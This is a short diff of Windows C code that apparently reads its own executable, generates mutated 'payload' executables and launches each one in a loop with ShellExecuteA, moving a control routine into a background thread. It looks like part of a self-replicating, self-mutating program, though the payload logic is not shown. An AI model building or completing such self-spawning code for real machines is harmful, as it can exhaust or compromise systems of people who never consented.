@@ -22,17 +22,19 @@ int MuPos = 0;
 int MuWatchDog = 0;
 
 char nextEXEName[256] = { 0 };
+char **global_argv = 0;
 
 struct timeb AccuTime;
 
 void GenNxtPayload();
 void MuNxtPayload();
 
-void Killer(void);
+void PopCtl(void);
 
 int main(int argc, char** argv)
 {
-    //printf("0x%x", myTestcode[0]);
+    global_argv = argv;
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
     ftime(&AccuTime);
     srand((unsigned)AccuTime.time);
     FILE* fp = fopen(argv[0], "rb");
@@ -101,6 +103,5 @@ int main(int argc, char** argv)
         
         Sleep(GapTime); // Order is important here to avoid producing so fast
         ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
-        Killer();
     }
 }
